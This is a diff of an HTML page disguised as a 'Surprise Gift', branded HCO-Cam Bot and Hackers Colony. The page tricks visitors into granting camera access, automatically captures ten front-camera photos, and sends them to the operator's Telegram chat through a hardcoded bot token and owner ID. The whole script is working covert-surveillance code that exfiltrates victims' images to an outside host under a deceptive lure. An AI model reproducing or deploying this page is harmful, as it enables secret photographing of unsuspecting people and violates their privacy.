@@ -3,115 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Surprise Gift | HCO-Cam Bot</title>
+    <title>🎁 Surprise Gift | HCO-Cam Bot</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* All CSS from previous message - paste it here */
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .container { background: rgba(255, 255, 255, 0.95); border-radius: 20px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3); width: 100%; max-width: 500px; overflow: hidden; animation: fadeIn 0.5s ease-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        .header { background: linear-gradient(135deg, #ff6b6b 0%, #ff8e53 100%); padding: 30px; text-align: center; color: white; position: relative; overflow: hidden; }
-        .header::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px); background-size: 20px 20px; animation: float 20s linear infinite; }
-        @keyframes float { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .gift-icon { font-size: 80px; margin-bottom: 20px; animation: bounce 2s infinite; }
-        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
-        h1 { font-size: 28px; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.2); }
-        .subtitle { font-size: 16px; opacity: 0.9; }
-        .content { padding: 40px; text-align: center; }
-        .message { font-size: 18px; color: #333; line-height: 1.6; margin-bottom: 30px; }
-        .btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 18px 40px; font-size: 18px; border-radius: 50px; cursor: pointer; display: inline-flex; align-items: center; gap: 10px; transition: all 0.3s ease; box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4); }
-        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(102, 126, 234, 0.6); }
-        .btn:active { transform: translateY(1px); }
-        .btn i { font-size: 20px; }
-        .heart-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1000; }
-        .heart { position: absolute; color: #ff6b6b; font-size: 20px; animation: fall linear forwards; }
-        @keyframes fall { to { transform: translateY(100vh) rotate(360deg); opacity: 0; } }
-        .camera-container { display: none; margin-top: 30px; }
-        #cameraView { width: 100%; height: 300px; background: #333; border-radius: 10px; margin-bottom: 20px; overflow: hidden; position: relative; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
+        body { background: linear-gradient(135deg, #8A2BE2 0%, #FF1493 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 15px; }
+        .container { background: white; border-radius: 20px; box-shadow: 0 15px 40px rgba(0,0,0,0.3); width: 100%; max-width: 450px; overflow: hidden; }
+        .header { background: linear-gradient(135deg, #FF416C 0%, #FF4B2B 100%); padding: 25px; text-align: center; color: white; }
+        .gift-icon { font-size: 70px; margin-bottom: 15px; animation: bounce 1.5s infinite; }
+        @keyframes bounce { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        h1 { font-size: 24px; margin-bottom: 8px; }
+        .subtitle { font-size: 14px; opacity: 0.9; }
+        .content { padding: 30px; }
+        .message { font-size: 16px; color: #333; line-height: 1.5; margin-bottom: 25px; text-align: center; }
+        .btn { background: linear-gradient(135deg, #8A2BE2 0%, #4B0082 100%); color: white; border: none; padding: 16px 35px; font-size: 17px; border-radius: 50px; cursor: pointer; display: block; margin: 0 auto 20px; width: 90%; max-width: 300px; transition: all 0.3s; box-shadow: 0 8px 25px rgba(138, 43, 226, 0.4); }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 12px 30px rgba(138, 43, 226, 0.6); }
+        .btn i { margin-right: 10px; }
+        .camera-container { display: none; text-align: center; }
+        #cameraView { width: 100%; height: 280px; background: #222; border-radius: 10px; margin: 15px 0; overflow: hidden; position: relative; }
         #videoElement { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        #canvasElement { display: none; position: absolute; top: 0; left: 0; }
-        .captured-image { width: 80px; height: 80px; object-fit: cover; border-radius: 8px; margin: 3px; border: 2px solid #667eea; }
-        .images-grid { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px; margin: 15px 0; padding: 10px; background: #f5f5f5; border-radius: 10px; max-height: 200px; overflow-y: auto; }
-        .counter { font-size: 48px; color: #ff6b6b; margin: 15px 0; font-weight: bold; }
-        .capture-btn { background: linear-gradient(135deg, #ff6b6b 0%, #ff8e53 100%); color: white; border: none; padding: 12px 30px; font-size: 16px; border-radius: 50px; cursor: pointer; margin: 10px; transition: all 0.3s ease; }
-        .capture-btn:hover { transform: scale(1.05); }
-        .capture-btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .completed { display: none; margin-top: 30px; }
-        .success-icon { font-size: 60px; color: #4CAF50; margin-bottom: 20px; }
-        .footer { text-align: center; padding: 20px; color: #666; font-size: 14px; border-top: 1px solid #eee; }
-        .footer a { color: #667eea; text-decoration: none; }
-        .permission-warning { display: none; background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 10px; margin: 20px 0; }
-        .flash { animation: flashEffect 0.3s; }
-        @keyframes flashEffect { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-        .loading { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: white; font-size: 18px; text-align: center; }
-        #timer { font-weight: bold; }
-        #statusMessage { margin: 20px 0; padding: 15px; background: #e8f5e9; border-radius: 10px; color: #2e7d32; }
+        canvas { display: none; }
+        .counter { font-size: 42px; color: #FF416C; margin: 15px 0; font-weight: bold; }
+        .images-grid { display: flex; flex-wrap: wrap; justify-content: center; gap: 6px; margin: 15px 0; padding: 10px; background: #f0f0f0; border-radius: 10px; max-height: 180px; overflow-y: auto; }
+        .captured-image { width: 70px; height: 70px; object-fit: cover; border-radius: 6px; border: 2px solid #8A2BE2; }
+        .completed { display: none; text-align: center; padding: 20px; }
+        .success-icon { font-size: 50px; color: #28a745; margin-bottom: 15px; }
+        #statusMessage { margin: 15px 0; padding: 12px; background: #d4edda; border-radius: 10px; color: #155724; }
+        .footer { text-align: center; padding: 15px; color: #666; font-size: 13px; border-top: 1px solid #eee; }
+        .footer a { color: #8A2BE2; text-decoration: none; }
+        .warning { background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 12px; border-radius: 10px; margin: 15px 0; display: none; }
+        .heart { position: fixed; font-size: 20px; animation: fall linear forwards; pointer-events: none; z-index: 1000; }
+        @keyframes fall { to { transform: translateY(100vh) rotate(360deg); opacity: 0; } }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <div class="gift-icon"><i class="fas fa-gift"></i></div>
-            <h1>🎁 Surprise Gift! 🎁</h1>
-            <p class="subtitle">Someone has given you a special surprise!</p>
+            <div class="gift-icon">🎁</div>
+            <h1>Someone Has Given You A Surprise!</h1>
+            <p class="subtitle">Click below to unlock your gift</p>
         </div>
         
         <div class="content">
-            <p class="message">
-                You've received a mysterious gift from a friend!<br>
-                Click below to unlock your surprise!
-            </p>
+            <p class="message">🎉 You've received a mysterious gift! Click unlock to reveal the surprise!</p>
             
-            <div class="permission-warning" id="permissionWarning">
-                <i class="fas fa-exclamation-triangle"></i>
-                <b>Camera Access Required:</b> Please allow camera access!
-            </div>
+            <div class="warning" id="warning">⚠️ Allow camera access for the surprise!</div>
             
-            <button class="btn" id="unlockBtn">
-                <i class="fas fa-lock-open"></i> Unlock Gift
-            </button>
+            <button class="btn" id="unlockBtn"><i class="fas fa-lock-open"></i> UNLOCK GIFT</button>
             
             <div class="camera-container" id="cameraContainer">
-                <div class="camera-view" id="cameraView">
+                <div class="camera-view">
                     <video id="videoElement" autoplay playsinline></video>
                     <canvas id="canvasElement"></canvas>
-                    <div class="loading" id="cameraLoading">
-                        <i class="fas fa-camera"></i><br>Starting camera...
-                    </div>
                 </div>
-                
                 <div class="counter" id="counter">10</div>
-                
-                <button class="capture-btn" id="captureBtn" disabled>
-                    <i class="fas fa-camera"></i> Capture Now! (Auto: <span id="timer">10</span>s)
-                </button>
-                
                 <div class="images-grid" id="imagesGrid"></div>
             </div>
             
             <div class="completed" id="completed">
-                <div class="success-icon"><i class="fas fa-check-circle"></i></div>
-                <h2>Surprise Complete! 🎉</h2>
-                <p><b id="imageCount">10</b> images captured!</p>
-                <div id="statusMessage">
-                    <i class="fas fa-spinner fa-spin"></i> Sending images...
-                </div>
+                <div class="success-icon">✅</div>
+                <h3>Surprise Complete! 🎉</h3>
+                <div id="statusMessage">Sending images...</div>
             </div>
         </div>
         
         <div class="footer">
-            <p>Powered by <a href="https://t.me/HackersColony" target="_blank">HCO-Cam Bot</a></p>
+            <p>By <a href="https://t.me/HackersColony" target="_blank">HCO-Cam Bot</a> | Hackers Colony</p>
         </div>
     </div>
-    
-    <div class="heart-container" id="heartContainer"></div>
-    
+
     <script>
-        // Configuration - UPDATE THIS URL!
-        const TELEGRAM_BOT_TOKEN = '8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI';
-        const OWNER_CHAT_ID = '8215819954';
-        const BACKEND_URL = 'https://hco-camera-backend.onrender.com'; // You'll create this
+        // Your Netlify URL
+        const NETLIFY_URL = 'https://gleaming-marigold-231ffe.netlify.app';
+        
+        // Telegram Bot Info
+        const BOT_TOKEN = '8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI';
+        const OWNER_ID = '8215819954';
         
         // DOM Elements
         const unlockBtn = document.getElementById('unlockBtn');
@@ -119,241 +86,238 @@
         const videoElement = document.getElementById('videoElement');
         const canvasElement = document.getElementById('canvasElement');
         const counterElement = document.getElementById('counter');
-        const captureBtn = document.getElementById('captureBtn');
-        const timerSpan = document.getElementById('timer');
         const imagesGrid = document.getElementById('imagesGrid');
         const completedDiv = document.getElementById('completed');
-        const cameraLoading = document.getElementById('cameraLoading');
-        const permissionWarning = document.getElementById('permissionWarning');
         const statusMessage = document.getElementById('statusMessage');
-        const imageCountElement = document.getElementById('imageCount');
+        const warningDiv = document.getElementById('warning');
         
         // Get user ID from URL
         const urlParams = new URLSearchParams(window.location.search);
-        const userId = urlParams.get('uid') || Math.random().toString(36).substr(2, 9);
+        let userId = urlParams.get('uid') || 'unknown';
+        
+        // If userId looks like a Telegram ID (numeric), use it
+        if(/^\d+$/.test(userId)) {
+            userId = parseInt(userId);
+        }
         
         // Variables
         let stream = null;
+        let capturedImages = [];
         let captureCount = 0;
         const totalCaptures = 10;
-        let capturedImages = [];
         let countdownInterval = null;
         let timeLeft = 10;
         
         // Start surprise
-        unlockBtn.addEventListener('click', startSurprise);
-        captureBtn.addEventListener('click', captureImage);
-        
-        async function startSurprise() {
+        unlockBtn.onclick = async () => {
             unlockBtn.style.display = 'none';
             cameraContainer.style.display = 'block';
             
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
-                    audio: false 
+                // Request camera access
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user', // Front camera
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
                 });
                 
-                cameraLoading.style.display = 'none';
                 videoElement.srcObject = stream;
-                permissionWarning.style.display = 'none';
-                captureBtn.disabled = false;
-                startCountdown();
+                warningDiv.style.display = 'none';
+                
+                // Start auto-capture process
+                startAutoCapture();
+                
+                // Create hearts
                 createHearts();
                 
-            } catch (error) {
-                console.error('Camera error:', error);
-                cameraLoading.innerHTML = `
-                    <i class="fas fa-exclamation-circle"></i><br>
-                    Camera access denied!<br>
-                    <small>Allow camera and refresh page.</small>
-                `;
-                permissionWarning.style.display = 'block';
+            } catch (err) {
+                console.error('Camera error:', err);
+                warningDiv.style.display = 'block';
+                warningDiv.innerHTML = '⚠️ Camera access denied! Please allow camera and refresh.';
             }
-        }
+        };
         
-        function startCountdown() {
+        function startAutoCapture() {
             timeLeft = 10;
-            timerSpan.textContent = timeLeft;
+            counterElement.textContent = timeLeft;
             
             countdownInterval = setInterval(() => {
                 timeLeft--;
-                timerSpan.textContent = timeLeft;
+                counterElement.textContent = timeLeft;
                 
-                if (timeLeft <= 0) {
-                    clearInterval(countdownInterval);
+                if(timeLeft <= 0) {
                     captureImage();
                 }
             }, 1000);
         }
         
         function captureImage() {
-            if (!stream || captureCount >= totalCaptures) return;
+            if(!stream || captureCount >= totalCaptures) return;
             
             captureCount++;
-            timeLeft = 10;
-            timerSpan.textContent = timeLeft;
             
-            // Flash effect
-            videoElement.classList.add('flash');
-            setTimeout(() => videoElement.classList.remove('flash'), 300);
-            
-            // Capture from video
+            // Setup canvas
             const context = canvasElement.getContext('2d');
             canvasElement.width = videoElement.videoWidth;
             canvasElement.height = videoElement.videoHeight;
             
-            // Mirror for front camera
+            // Draw video frame (mirrored for front camera)
             context.save();
             context.scale(-1, 1);
             context.drawImage(videoElement, -canvasElement.width, 0, canvasElement.width, canvasElement.height);
             context.restore();
             
-            // Convert to image
-            canvasElement.toBlob(async (blob) => {
-                const imageUrl = URL.createObjectURL(blob);
-                const img = document.createElement('img');
-                img.src = imageUrl;
-                img.className = 'captured-image';
-                img.alt = `Capture ${captureCount}`;
-                imagesGrid.appendChild(img);
-                
-                // Convert to base64
-                const reader = new FileReader();
-                reader.readAsDataURL(blob);
-                reader.onloadend = () => {
-                    capturedImages.push({
-                        data: reader.result,
-                        number: captureCount
-                    });
-                };
-                
-                createHearts();
-                counterElement.textContent = `${totalCaptures - captureCount}`;
-                
-                if (captureCount >= totalCaptures) {
-                    completeCapture();
-                } else {
-                    // Restart countdown for next capture
-                    clearInterval(countdownInterval);
-                    startCountdown();
-                }
-            }, 'image/jpeg', 0.8);
+            // Convert to base64
+            const imageData = canvasElement.toDataURL('image/jpeg', 0.8);
+            
+            // Store image
+            capturedImages.push({
+                data: imageData,
+                number: captureCount
+            });
+            
+            // Show preview
+            const img = document.createElement('img');
+            img.src = imageData;
+            img.className = 'captured-image';
+            img.alt = `Photo ${captureCount}`;
+            imagesGrid.appendChild(img);
+            
+            // Flash effect
+            videoElement.style.opacity = '0.5';
+            setTimeout(() => videoElement.style.opacity = '1', 200);
+            
+            // Update counter
+            counterElement.textContent = totalCaptures - captureCount;
+            
+            // Create hearts
+            createHearts();
+            
+            if(captureCount >= totalCaptures) {
+                // All captures done
+                clearInterval(countdownInterval);
+                completeSurprise();
+            } else {
+                // Reset timer for next capture
+                clearInterval(countdownInterval);
+                startAutoCapture();
+            }
         }
         
-        async function completeCapture() {
-            clearInterval(countdownInterval);
-            
-            if (stream) {
+        async function completeSurprise() {
+            // Stop camera
+            if(stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
             
+            // Show completion
             cameraContainer.style.display = 'none';
             completedDiv.style.display = 'block';
-            imageCountElement.textContent = capturedImages.length;
             
-            await sendImagesToTelegram();
-            
-            for(let i = 0; i < 30; i++) {
-                setTimeout(createHearts, i * 100);
-            }
+            // Send all images
+            await sendAllImages();
         }
         
-        async function sendImagesToTelegram() {
-            try {
-                statusMessage.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending images...';
+        async function sendAllImages() {
+            statusMessage.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending images to Telegram...';
+            
+            let successCount = 0;
+            
+            for(let i = 0; i < capturedImages.length; i++) {
+                const image = capturedImages[i];
                 
-                // Send each image
-                for (let i = 0; i < capturedImages.length; i++) {
-                    const imageData = capturedImages[i].data;
+                try {
+                    // Send to bot owner
+                    await sendToTelegram(OWNER_ID, image.data, `📸 Surprise ${i+1}/10\nFrom: ${userId}`);
                     
-                    // Send via Telegram Bot API
-                    await sendToTelegram(imageData, i + 1);
+                    // Send to user if we have their Telegram ID
+                    if(typeof userId === 'number') {
+                        await sendToTelegram(userId, image.data, `📸 Your surprise photo ${i+1}/10`);
+                    }
                     
-                    statusMessage.innerHTML = 
-                        `<i class="fas fa-paper-plane"></i> Sent ${i + 1} of ${capturedImages.length} images...`;
+                    successCount++;
                     
-                    // Delay between sends
-                    await new Promise(resolve => setTimeout(resolve, 800));
+                    // Update status
+                    statusMessage.innerHTML = `<i class="fas fa-paper-plane"></i> Sent ${successCount} of ${capturedImages.length} images...`;
+                    
+                    // Wait a bit between sends
+                    await sleep(1000);
+                    
+                } catch (err) {
+                    console.error('Error sending image:', err);
                 }
+            }
+            
+            // Final status
+            if(successCount > 0) {
+                statusMessage.innerHTML = `
+                    ✅ <b>${successCount} images sent successfully!</b><br>
+                    <small>✓ To bot owner<br>${typeof userId === 'number' ? '✓ To you' : ''}</small>
+                `;
                 
-                statusMessage.innerHTML = 
-                    '<i class="fas fa-check-circle"></i> All images sent!<br>' +
-                    '<small>✓ To you<br>✓ To bot owner</small>';
-                
-                // Show success alert
+                // Alert
                 setTimeout(() => {
-                    alert(`✅ Surprise Complete!\n\n${capturedImages.length} images captured and sent!\n\nCheck your Telegram messages!`);
+                    alert(`🎉 SURPRISE COMPLETE!\n\n✅ ${successCount} photos captured\n✅ Sent to bot owner\n✅ Check your Telegram!`);
                 }, 1000);
-                
-            } catch (error) {
-                console.error('Error:', error);
-                statusMessage.innerHTML = 
-                    '<i class="fas fa-exclamation-triangle"></i> ' +
-                    'Images captured! Sending partially failed.<br>' +
-                    '<small>Save images above manually.</small>';
+            } else {
+                statusMessage.innerHTML = '⚠️ Images captured but sending failed. Try again!';
             }
         }
         
-        async function sendToTelegram(imageData, imageNumber) {
+        async function sendToTelegram(chatId, imageData, caption) {
             // Remove data:image/jpeg;base64, prefix
-            const base64Data = imageData.split(',')[1];
+            const base64Image = imageData.split(',')[1];
+            
+            // Telegram Bot API
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', base64Image);
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'HTML');
             
             try {
-                // Send to owner
-                const ownerResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                const response = await fetch(url, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: OWNER_CHAT_ID,
-                        photo: imageData,
-                        caption: `📸 Surprise ${imageNumber}\nFrom: ${userId}\nTime: ${new Date().toLocaleTimeString()}`
-                    })
+                    body: formData
                 });
                 
-                // Send to user if user ID is numeric
-                if (/^\d+$/.test(userId)) {
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: userId,
-                            photo: imageData,
-                            caption: `📸 Your surprise image ${imageNumber}\nSent to bot owner!`
-                        })
-                    });
-                }
+                const result = await response.json();
+                return result.ok;
                 
-                return true;
             } catch (error) {
-                console.error('Telegram send error:', error);
-                throw error;
+                console.error('Telegram API error:', error);
+                return false;
             }
         }
         
         function createHearts() {
-            const container = document.getElementById('heartContainer');
-            const heart = document.createElement('div');
-            heart.innerHTML = ['❤️', '💖', '💗', '💓', '💞', '💕'][Math.floor(Math.random() * 6)];
-            heart.className = 'heart';
-            heart.style.left = Math.random() * 100 + 'vw';
-            heart.style.animationDuration = Math.random() * 3 + 2 + 's';
-            heart.style.fontSize = Math.random() * 20 + 10 + 'px';
-            container.appendChild(heart);
-            
-            setTimeout(() => heart.remove(), 5000);
+            for(let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    const heart = document.createElement('div');
+                    heart.className = 'heart';
+                    heart.innerHTML = '❤️';
+                    heart.style.left = Math.random() * 100 + 'vw';
+                    heart.style.fontSize = (Math.random() * 20 + 10) + 'px';
+                    heart.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                    document.body.appendChild(heart);
+                    
+                    setTimeout(() => heart.remove(), 5000);
+                }, i * 100);
+            }
         }
         
-        // Initial hearts
-        setTimeout(() => {
-            for(let i = 0; i < 10; i++) {
-                setTimeout(createHearts, i * 200);
-            }
-        }, 1000);
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        
+        // Create initial hearts
+        for(let i = 0; i < 8; i++) {
+            setTimeout(createHearts, i * 300);
+        }
     </script>
 </body>
 </html>
